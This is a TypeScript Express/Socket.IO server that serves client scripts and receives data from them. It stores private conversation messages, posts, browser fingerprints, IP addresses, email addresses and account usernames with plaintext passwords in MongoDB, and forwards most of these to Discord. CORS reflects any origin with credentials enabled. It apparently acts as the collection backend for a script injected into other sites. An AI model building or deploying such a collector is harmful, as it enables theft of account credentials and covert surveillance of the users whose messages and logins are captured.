import http from 'http';
import { MongoClient, ObjectId } from 'mongodb';
import cors, { type CorsOptions } from 'cors';
import express from 'express';
import compression from 'compression';
import { Server } from 'socket.io';
import { addressToAddressAsString, getClientIpAddresses, logMessage } from '@helpers';
import { colorHash } from '@globals';
import {
	isAccountCredentialsData,
	isConversationAndConversationMessageData,
	isEmailAddressData,
	isIpAddressData,
	isNavigatorPropertiesData,
	isSenderInfo,
	isThreadAndPostData,
} from '@guards';
import {
	ACCOUNT_CREDENTIALS_COLLECTION_NAME,
	CONVERSATION_MESSAGES_COLLECTION_NAME,
	EMAIL_ADDRESSES_COLLECTION_NAME,
	IP_ADDRESSES_COLLECTION_NAME,
	MONGODB_CONNECTION_STRING,
	MONGODB_DATABASE_NAME,
	NAVIGATOR_PROPERTIES_COLLECTION_NAME,
	POST_MESSAGES_COLLECTION_NAME,
	SERVER_PORT,
} from '@env';

const mongoClient = new MongoClient(MONGODB_CONNECTION_STRING);
const db = mongoClient.db(MONGODB_DATABASE_NAME);

(async () => {
	try {
		await mongoClient.connect();
	} catch (e) {
		console.error(e);

		process.exit();
	}
})();

const corsOptions: CorsOptions = {
	// Configures the Access-Control-Allow-Origin CORS header.
	// Set origin to true to reflect the request origin, as defined by req.header('Origin').
	// See: https://expressjs.com/en/resources/middleware/cors.html
	origin: true,
	credentials: true,
};

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
	cors: corsOptions,
});

app.use(compression());
app.use(cors(corsOptions));

app.get('/', async (req, res) => {
	const allSockets = await io.allSockets();

	res.send(
		`Number of connected sockets: ${allSockets.size}<br />Socket IDs: ${
			Array.prototype.join.call(allSockets.values(), ', ') || 'No sockets connected'
		}`
	);
});

app.use('/yoshimitsu-client.js', express.static(require.resolve('yoshimitsu-client')));
app.use('/yoshimitsu-external.js', express.static('yoshimitsu-external.js'));

io.on('connection', (socket) => {
	console.log('A client has connected.');

	const { mainClientIpAddress, clientIpAddresses } = getClientIpAddresses(socket);
	const clientColor = colorHash.hex(mainClientIpAddress);

	socket.on('conversation message', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isConversationAndConversationMessageData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord
		logMessage({
			data,
			title: 'Conversation Message',
			description: `Received conversation message from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
			notifyOnDiscord: true,
		});

		// Insert the data into the collection.
		const collection = db.collection(CONVERSATION_MESSAGES_COLLECTION_NAME);

		try {
			await collection.insertOne({
				_id: new ObjectId(data.conversationMessageId),
				...info,
				ipAddress: mainClientIpAddress,
				additionalIpAddresses: clientIpAddresses,
				...data,
			});
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('post message', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isThreadAndPostData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord.
		logMessage({
			data,
			title: 'Post Message',
			description: `Received post message from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
			notifyOnDiscord: true,
		});

		// Insert the data into the collection.
		const collection = db.collection(POST_MESSAGES_COLLECTION_NAME);

		try {
			await collection.insertOne({
				_id: new ObjectId(data.postId),
				...info,
				ipAddress: mainClientIpAddress,
				additionalIpAddresses: clientIpAddresses,
				...data,
			});
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('navigator properties', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isNavigatorPropertiesData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord.
		logMessage({
			data,
			title: 'Navigator Properties',
			description: `Received navigator properties from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
			notifyOnDiscord: true,
		});

		// Insert the data into the collection.
		const collection = db.collection(NAVIGATOR_PROPERTIES_COLLECTION_NAME);

		try {
			await collection.insertOne({ ...info, ipAddress: mainClientIpAddress, additionalIpAddresses: clientIpAddresses, ...data });
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('ip address', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isIpAddressData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord.
		logMessage({
			data,
			title: 'IP Address',
			description: `Received ip address from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
			notifyOnDiscord: true,
		});

		// Insert the data into the collection.
		const collection = db.collection(IP_ADDRESSES_COLLECTION_NAME);

		try {
			await collection.insertOne({
				...info,
				ipAddress: mainClientIpAddress,
				additionalIpAddresses: clientIpAddresses,
				cfIpAddress: data.ipAddress,
			});
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('account credentials', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isAccountCredentialsData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord.
		logMessage({
			data,
			title: 'Account Credentials',
			description: `Received account credentials from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
		});

		// Insert the data into the collection.
		const collection = db.collection(ACCOUNT_CREDENTIALS_COLLECTION_NAME);

		try {
			await collection.insertOne({
				...info,
				ipAddress: mainClientIpAddress,
				additionalIpAddresses: clientIpAddresses,
				accountUsername: data.username,
				accountPassword: data.password,
			});
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('email address', async (info: unknown, data: unknown, cb: unknown) => {
		if (!isSenderInfo(info) || !isEmailAddressData(data) || typeof cb !== 'function') {
			return;
		}

		// Forwards the received data to Discord.
		logMessage({
			data,
			title: 'Email Address',
			description: `Received ip address from '${info.username}' (${mainClientIpAddress}, ${info.origin}).`,
			color: clientColor,
		});

		// Insert the data into the collection.
		const collection = db.collection(EMAIL_ADDRESSES_COLLECTION_NAME);

		try {
			await collection.insertOne({ ...info, ipAddress: mainClientIpAddress, additionalIpAddresses: clientIpAddresses, ...data });
		} catch (e) {
			console.warn(e);

			return;
		}

		// Sends acknowledgement back to the client.
		cb({ status: 'ok' });
	});

	socket.on('disconnect', () => {
		console.log('A client has disconnected.');
	});
});

const listener = server.listen(SERVER_PORT, () => {
	const address = listener.address();

	console.log(`Server is listening on ${addressToAddressAsString(address)}.`);
});
